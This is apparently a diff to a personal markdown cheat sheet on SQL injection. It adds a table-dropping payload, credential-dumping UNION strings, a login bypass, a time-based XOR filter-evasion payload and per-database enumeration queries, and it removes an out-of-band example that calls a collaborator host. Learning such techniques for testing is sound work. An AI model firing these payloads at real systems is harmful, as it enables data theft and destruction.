@@ -19,20 +19,20 @@
 [Home](../README.md)
 
 Todo
-- Example of out-of-bound network interactions
-- Get all tables
-- Get all columns in a table
 - Example of an SQL injection with better explanation
-- Star repo of different sql attacks
 
 # SQL Injection(SQLi)
 SQL injection allows an attacker to make unrequested queries or modifications to the database.
 
-```SQL
-SELECT * FROM users WHERE = ' userInput ';
-```
+Let's assume the server makes this query with user input. `SELECT * FROM users WHERE = 'user_input';`
 
-When sending request since you cannot use spaces you can use `%20` instead.
+If the user were to input `' OR 1=1; DROP TABLE users; --` the resulting query would be `SELECT * FROM users WHERE = '' OR 1=1; DROP TABLE users; -- ';`.
+
+This allows the user to write any SQL to the db. Everything after the `--` is commented out so the request doesn't error out.
+
+Sometimes `#` can be used as comments instead of `--`
+
+When sending request over the URL you can use `%20` as spaces.
 
 ## Test is the db vulnerable to SQLi
 - Look for SQL keywords in source code which may tell you what they are using.
@@ -47,22 +47,18 @@ To solve this you can use
 - Out-of-bound network interactions
 	- The attacker injects SQL which triggers the database to communicate with the attacker's server.
 
-```SQL
-exec master..xp_dirtree
-'//0efdymgw1o5w9inae8mg4dfrgim9ay.
-burpcollaborator.net/a'
-```
-
 ## List of good SQL attacks
 - `' UNION SELECT username, password FROM users; --`
 - `' OR 1=1; YOUR INJECTION HERE; --`
+- Use XOR to prevent filters
+	- Ex: `0'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z`
 - On a login page
 	- `admin'--` or `administrator'--` for the username
 - Get the version of the database
-	- Oracle: `SELECT * FROM v$version`
 	- MySQL: `SELECT VERSION();`
 	- Postgres: `SELECT version();`
 	- SQL Server: `SELECT @@VERSION;`
+	- Oracle: `SELECT * FROM v$version`
 	- SQLite: `SELECT sqlite_version();`
 	- IBM Db2: `SELECT * FROM sysibm.sysversions;`
 - Get all tables
@@ -70,8 +66,11 @@ burpcollaborator.net/a'
 	- Postgres, SQL Server: `SELECT * FROM information_schema.tables`
 	- Oracle: `SELECT table_name FROM user_tables;`
 	- SQLite: `SELECT name FROM sqlite_master WHERE type='table';`
-	- IBM Db2: 
+	- IBM Db2: `SELECT tabname FROM syscat.tables'`
 - Get all columns in a table
-	- 
+	- MySQL and Oracle: `DESCRIBE table_name;` or `SHOW COLUMNS FROM table_name;`
+	- Postgres, SQL Server: `SELECT COLUMN_NAME from information_schema.columns where table_name = 'table_name'`
+	- SQLite doesn't have this feature.
+	- IBM Db2: `SELECT colname FROM syscat.columns WHERE tabname = 'table_name';`
 
-' UNION SELECT NULL, NULL, NULL;
+## Solution
